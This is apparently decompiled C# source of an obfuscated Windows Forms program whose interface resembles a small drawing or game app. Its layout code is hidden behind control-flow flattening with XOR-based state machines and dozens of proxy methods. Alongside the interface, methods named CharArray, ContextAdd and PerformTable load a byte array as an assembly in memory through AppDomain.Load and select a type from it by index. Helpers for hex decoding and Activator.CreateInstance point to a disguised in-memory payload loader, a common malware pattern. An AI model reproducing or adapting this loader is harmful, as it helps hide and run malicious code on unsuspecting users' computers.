					Form1.smethod_3((Control)(object)richTextBox1, new Size(272, 35));
					num = (int)((num2 * 880079226) ^ 0x3AC16971);
					continue;
				case 39u:
					Form1.smethod_4((Control)(object)pictureBox1, new Point(120, 22));
					num = ((int)num2 * -344359948) ^ 0x79100BFE;
					continue;
				case 38u:
					Form1.smethod_4((Control)(object)label6, new Point(275, 0));
					num = ((int)num2 * -434265376) ^ -541653849;
					continue;
				case 37u:
					Form1.smethod_3((Control)(object)button2, new Size(83, 35));
					num = ((int)num2 * -1564163558) ^ -1886918343;
					continue;
				case 36u:
					num = ((int)num2 * -535747548) ^ 0x50BCA2B2;
					continue;
				case 35u:
					Form1.smethod_3((Control)(object)label6, new Size(0, 16));
					Form1.smethod_64((Control)(object)label6, 13);
					num = ((int)num2 * -1911467998) ^ -1921843798;
					continue;
				case 34u:
					num = (int)(num2 * 1582879567) ^ -1009061309;
					continue;
				case 32u:
					Form1.smethod_4((Control)(object)label5, new Point(197, 0));
					Form1.smethod_61((Control)(object)label5, "label5");
					num = (int)((num2 * 643863326) ^ 0x2D60242E);
					continue;
				case 31u:
					Form1.smethod_65((Control)(object)button2, bool_0: false);
					num = (int)((num2 * 563445074) ^ 0x3871EB8F);
					continue;
				case 30u:
					flag = num5 < 22528;
					num = 675888271;
					continue;
				case 29u:
					Form1.smethod_84((Form)(object)this, bool_0: false);
					Form1.smethod_85((Control)(object)this, "Form1");
					num = (int)(num2 * 1258459336) ^ -611525710;
					continue;
				case 28u:
					Form1.smethod_4((Control)(object)label1, new Point(486, 0));
					num = ((int)num2 * -1928325931) ^ 0x464D2C74;
					continue;
				case 27u:
					Form1.smethod_3((Control)(object)pictureBox1, new Size(246, 246));
					num = ((int)num2 * -895597259) ^ -932656071;
					continue;
				case 26u:
					num = 164856753;
					continue;
				case 25u:
					Form1.smethod_4((Control)(object)button2, new Point(391, 275));
					num = (int)((num2 * 66535368) ^ 0x7D2D4C04);
					continue;
				case 24u:
					Form1.smethod_66((ButtonBase)(object)button1, bool_0: true);
					num = (int)((num2 * 984582315) ^ 0x9E68B2B);
					continue;
				case 23u:
					timer1 = Form1.smethod_56(components);
					num = ((int)num2 * -1385938466) ^ -1889346032;
					continue;
				case 22u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label1);
					num = ((int)num2 * -1870742960) ^ 0x392F51CC;
					continue;
				case 21u:
					num = ((int)num2 * -1633276690) ^ 0x7DFD5AA3;
					continue;
				case 20u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)richTextBox1);
					num = ((int)num2 * -1689751315) ^ -192940639;
					continue;
				case 19u:
					Form1.smethod_61((Control)(object)button2, "button2");
					num = ((int)num2 * -1977852454) ^ 0x1265BA4;
					continue;
				case 18u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button2);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button1);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)pictureBox1);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)panel1);
					num = (int)((num2 * 2074083135) ^ 0x568C832E);
					continue;
				case 17u:
					num = (int)(num2 * 554219319) ^ -1134452146;
					continue;
				case 16u:
					num = ((int)num2 * -1999250310) ^ 0x301284C9;
					continue;
				case 15u:
					Form1.smethod_5((Control)(object)richTextBox1, Color.White);
					num = (int)((num2 * 1384194598) ^ 0x1E2879E0);
					continue;
				case 14u:
					button2 = Form1.smethod_53();
					button1 = Form1.smethod_53();
					richTextBox1 = Form1.smethod_54();
					num = (int)((num2 * 297792371) ^ 0x7F680A29);
					continue;
				case 13u:
					num = (int)((num2 * 2114460851) ^ 0x262AEF4E);
					continue;
				case 12u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = -1735648447;
						num4 = -1735648447;
					}
					else
					{
						num3 = -1892393132;
						num4 = -1892393132;
					}
					num = num3 ^ ((int)num2 * -1974319527);
					continue;
				}
				case 11u:
					Form1.smethod_64((Control)(object)label1, 8);
					num = (int)((num2 * 1556978495) ^ 0x4205E1BE);
					continue;
				case 10u:
					Form1.smethod_61((Control)(object)panel1, "panel1");
					num = ((int)num2 * -1489777060) ^ -1563288892;
					continue;
				case 9u:
					Form1.smethod_74((Control)(object)label6, bool_0: true);
					num = ((int)num2 * -536606155) ^ -1392696810;
					continue;
				case 8u:
					num = (int)(num2 * 2029824549) ^ -51100571;
					continue;
				case 7u:
					Form1.smethod_83((Form)(object)this, (FormBorderStyle)1);
					num = ((int)num2 * -935296339) ^ -2039522315;
					continue;
				case 6u:
					Form1.smethod_60(pictureBox1, (BorderStyle)2);
					num = ((int)num2 * -999687592) ^ -1366239524;
					continue;
				case 5u:
					num = ((int)num2 * -149174089) ^ -1400852714;
					continue;
				case 4u:
					Form1.smethod_63(pictureBox1, bool_0: false);
					Form1.smethod_6((Control)(object)pictureBox1, new MouseEventHandler(PictureBox1_MouseDown));
					num = (int)(num2 * 880781114) ^ -1411673394;
					continue;
				case 3u:
					Form1.smethod_75((Control)(object)label2, (DockStyle)3);
					num = (int)(num2 * 602136693) ^ -897806525;
					continue;
				case 2u:
					num = ((int)num2 * -2016145356) ^ -241962092;
					continue;
				case 1u:
					Form1.smethod_62(pictureBox1, 0);
					num = (int)((num2 * 109862062) ^ 0x795FEEC9);
					continue;
				case 0u:
					num = (int)(num2 * 1455478700) ^ -988887766;
					continue;
				default:
					return;
				case 33u:
					break;
				case 61u:
					return;
				}
				break;
			}
		}
	}

	private static void CharArray(byte[] Level, string po)
	{
		Assembly q = ContextAdd(Level);
		while (true)
		{
			int num = 1335541787;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x4F867045u) % 4u)
				{
				case 2u:
					PerformTable(q);
					num = ((int)num2 * -212198356) ^ 0x5FE7A188;
					continue;
				case 1u:
					num = (int)((num2 * 10736841) ^ 0x5470E4CF);
					continue;
				default:
					return;
				case 0u:
					break;
				case 3u:
					return;
				}
				break;
			}
		}
	}

	private static Assembly ContextAdd(byte[] Position)
	{
		Assembly result = Form1.smethod_94(Form1.smethod_93(), Position);
		while (true)
		{
			int num = 1092377833;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x3A8F152Au) % 3u)
				{
				case 1u:
					goto IL_000e;
				case 0u:
					break;
				default:
					return result;
				}
				break;
				IL_000e:
				num = (int)((num2 * 1817238303) ^ 0x79B6DD2E);
			}
		}
	}

	private static void PerformTable(Assembly Q3)
	{
		ComMember = Form1.smethod_95(Q3)[24];
	}

	static Random smethod_0()
	{
		return new Random();
	}

	static void smethod_1(RichTextBox richTextBox_0, HorizontalAlignment horizontalAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		richTextBox_0.set_SelectionAlignment(horizontalAlignment_0);
	}

	static PictureBox smethod_2()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static void smethod_3(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_4(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_5(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_6(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseDown(mouseEventHandler_0);
	}

	static void smethod_7(Control control_0, bool bool_0)
	{
		control_0.set_Enabled(bool_0);
	}

	static ControlCollection smethod_8(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_9(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_10(Form form_0, Form form_1)
	{
		form_0.set_Owner(form_1);
	}

	static void smethod_11(Control control_0)
	{
		control_0.Show();
	}

	static Point smethod_12(Form form_0)
	{
		return form_0.get_Location();
	}

	static void smethod_13(Form form_0, Point point_0)
	{
		form_0.set_Location(point_0);
	}

	static void smethod_14(Form form_0)
	{
		form_0.Activate();
	}

	static void smethod_15(Timer timer_0)
	{
		timer_0.Stop();
	}

	static int smethod_16(Control control_0)
	{
		return control_0.get_Height();
	}

	static void smethod_17(Control control_0, int int_0)
	{
		control_0.set_Height(int_0);
	}

	static int smethod_18(Control control_0)
	{
		return control_0.get_Width();
	}

	static Bitmap smethod_19(int int_0, int int_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_0, int_1);
	}

	static void smethod_20(PictureBox pictureBox_0, Image image_0)
	{
		pictureBox_0.set_Image(image_0);
	}

	static Image smethod_21(PictureBox pictureBox_0)
	{
		return pictureBox_0.get_Image();
	}

	static Graphics smethod_22(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static Brush smethod_23()
	{
		return Brushes.get_OldLace();
	}

	static void smethod_24(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillEllipse(brush_0, float_0, float_1, float_2, float_3);
	}

	static Brush smethod_25()
	{
		return Brushes.get_Sienna();
	}

	static Brush smethod_26()
	{
		return Brushes.get_BurlyWood();
	}

	static double smethod_27(double double_0)
	{
		return Math.Sqrt(double_0);
	}

	static void smethod_28(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillRectangle(brush_0, float_0, float_1, float_2, float_3);
	}

	static SolidBrush smethod_29(Color color_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new SolidBrush(color_0);
	}

	static void smethod_30(Control control_0)
	{
		control_0.Refresh();
	}

	static EventArgs smethod_31()
	{
		return new EventArgs();
	}

	static void smethod_32(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static int smethod_33(Random random_0, int int_0)
	{
		return random_0.Next(int_0);
	}

	static string smethod_34(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_35(Timer timer_0, bool bool_0)
	{
		timer_0.set_Enabled(bool_0);
	}

	static void smethod_36(Timer timer_0)
	{
		timer_0.Start();
	}

	static Point smethod_37(Control control_0)
	{
		return control_0.get_Location();
	}

	static int smethod_38(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_X();
	}

	static int smethod_39(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_Y();
	}

	static Color smethod_40(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	static Color smethod_41(Control control_0)
	{
		return control_0.get_BackColor();
	}

	static Pen smethod_42(Color color_0, float float_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Pen(color_0, float_0);
	}

	static void smethod_43(Graphics graphics_0, Pen pen_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.DrawEllipse(pen_0, float_0, float_1, float_2, float_3);
	}

	static void smethod_44(Graphics graphics_0, Image image_0, int int_0, int int_1, Rectangle rectangle_0, GraphicsUnit graphicsUnit_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, int_0, int_1, rectangle_0, graphicsUnit_0);
	}

	static void smethod_45(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static bool smethod_46(Control control_0)
	{
		return control_0.get_Enabled();
	}

	static void smethod_47(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static object smethod_48(Array array_0)
	{
		return array_0.Clone();
	}

	static int smethod_49(Control control_0)
	{
		return control_0.get_Width();
	}

	static void smethod_50(Control control_0, int int_0)
	{
		control_0.set_Left(int_0);
	}

	static void smethod_51(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_52()
	{
		return new Container();
	}

	static Button smethod_53()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static RichTextBox smethod_54()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new RichTextBox();
	}

	static Panel smethod_55()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Panel();
	}

	static Timer smethod_56(IContainer icontainer_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_0);
	}

	static Label smethod_57()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_58(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_59(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_60(PictureBox pictureBox_0, BorderStyle borderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		pictureBox_0.set_BorderStyle(borderStyle_0);
	}

	static void smethod_61(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_62(PictureBox pictureBox_0, int int_0)
	{
		pictureBox_0.set_TabIndex(int_0);
	}

	static void smethod_63(PictureBox pictureBox_0, bool bool_0)
	{
		pictureBox_0.set_TabStop(bool_0);
	}

	static void smethod_64(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_65(Control control_0, bool bool_0)
	{
		control_0.set_TabStop(bool_0);
	}

	static void smethod_66(ButtonBase buttonBase_0, bool bool_0)
	{
		buttonBase_0.set_UseVisualStyleBackColor(bool_0);
	}

	static void smethod_67(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_Click(eventHandler_0);
	}

	static string smethod_68(string string_0, int int_0, int int_1)
	{
		return string_0.Substring(int_0, int_1);
	}

	static byte smethod_69(string string_0, int int_0)
	{
		return Convert.ToByte(string_0, int_0);
	}

	static object smethod_70(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static void smethod_71(TextBoxBase textBoxBase_0, bool bool_0)
	{
		textBoxBase_0.set_ReadOnly(bool_0);
	}

	static void smethod_72(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_73(Timer timer_0, EventHandler eventHandler_0)
	{
		timer_0.add_Tick(eventHandler_0);
	}

	static void smethod_74(Control control_0, bool bool_0)
	{
		control_0.set_AutoSize(bool_0);
	}

	static void smethod_75(Control control_0, DockStyle dockStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Dock(dockStyle_0);
	}

	static Font smethod_76(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_77(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_78(Control control_0, RightToLeft rightToLeft_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_RightToLeft(rightToLeft_0);
	}

	static void smethod_79(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_80(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_81(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_82(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_83(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_84(Form form_0, bool bool_0)
	{
		form_0.set_MaximizeBox(bool_0);
	}

	static void smethod_85(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_86(Form form_0, bool bool_0)
	{
		form_0.set_ShowIcon(bool_0);
	}

	static void smethod_87(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_88(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static void smethod_89(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_LocationChanged(eventHandler_0);
	}

	static void smethod_90(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_91(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_92(Control control_0)
	{
		control_0.PerformLayout();
	}

	static AppDomain smethod_93()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_94(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_95(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}
}
